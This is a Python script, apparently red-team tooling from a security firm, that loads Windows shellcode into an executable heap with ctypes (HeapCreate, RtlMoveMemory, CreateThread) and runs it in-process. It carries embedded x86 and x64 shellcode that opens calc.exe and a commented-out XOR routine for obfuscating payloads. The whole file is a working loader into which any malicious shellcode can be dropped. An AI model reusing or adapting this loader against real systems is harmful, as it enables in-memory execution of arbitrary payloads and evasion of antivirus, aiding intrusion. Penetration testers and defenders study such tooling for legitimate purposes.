#!/usr/bin/env python3

import ctypes
import ctypes.wintypes as wt
import platform
import numpy


class ShellcodeExecute():

    calc_x86 = b""
    calc_x86 += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    calc_x86 += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    calc_x86 += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    calc_x86 += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    calc_x86 += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    calc_x86 += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    calc_x86 += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    calc_x86 += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    calc_x86 += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    calc_x86 += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    calc_x86 += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
    calc_x86 += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    calc_x86 += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
    calc_x86 += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    calc_x86 += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

    calc_x64 = b""
    calc_x64 += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
    calc_x64 += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
    calc_x64 += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
    calc_x64 += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
    calc_x64 += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
    calc_x64 += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
    calc_x64 += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
    calc_x64 += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
    calc_x64 += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
    calc_x64 += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
    calc_x64 += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
    calc_x64 += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
    calc_x64 += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
    calc_x64 += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    calc_x64 += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    calc_x64 += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
    calc_x64 += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
    calc_x64 += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
    calc_x64 += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
    calc_x64 += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    calc_x64 += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
    calc_x64 += b"\x78\x65\x00"

    HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
    HEAP_ZERO_MEMORY = 0x00000008

    # CreateThread()
    CreateThread = ctypes.windll.kernel32.CreateThread
    CreateThread.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
        wt.LPVOID, wt.DWORD, wt.LPVOID
    ]

    # HeapCreate()
    HeapCreate = ctypes.windll.kernel32.HeapCreate
    HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
    HeapCreate.restype = wt.HANDLE

    # HeapAlloc()
    HeapAlloc = ctypes.windll.kernel32.HeapAlloc
    HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
    HeapAlloc.restype = wt.LPVOID

    # RtlMoveMemory()
    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
    RtlMoveMemory.restype = wt.LPVOID

    # WaitForSingleObject
    WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
    WaitForSingleObject.restype = wt.DWORD

    def __init__(self, shellcode=None):
        print('''\
  _______________________________________________________

    shellcode.py: Simple shellcode execution on Python3
    process heap.
    Version 1.0 (c) Joff Thyer
    Black Hills Information Security LLC
    River Gum Security LLC
  _______________________________________________________
''')
 
        if shellcode is None and platform.architecture()[0] == '64bit':
            print('[*] 64-Bit Python Interpreter')
            self.shellcode = self.calc_x64
            #self.shellcode = self.xorstr(self.buf, b'myencryptionkey')
        else:
            print('[*] 32-Bit Python Interpreter')
            self.shellcode = self.calc_x86
            #self.shellcode = self.xorstr(self.buf, b'myencryptionkey')
        self.execute()

    def execute(self):
        heap = self.HeapCreate(
            self.HEAP_CREATE_ENABLE_EXECUTE, len(self.shellcode), 0)
        self.HeapAlloc(heap, self.HEAP_ZERO_MEMORY, len(self.shellcode))
        print('[*] HeapAlloc() Memory at: {:08X}'.format(heap))
        self.RtlMoveMemory(heap, self.shellcode, len(self.shellcode))
        print('[*] Shellcode copied into memory.')
        thread = self.CreateThread(0, 0, heap, 0, 0, 0)
        print('[*] CreateThread() in same process.')
        self.WaitForSingleObject(thread, 0xFFFFFFFF)

    def xorstr(self, data, k):
        m = int(len(data) / len(k))
        r = len(data) % len(k)
        newkey = k * m + k[:r]
        res = numpy.bitwise_xor(bytearray(data), bytearray(newkey))
        return bytes(res)

if __name__ == '__main__':
    ShellcodeExecute()
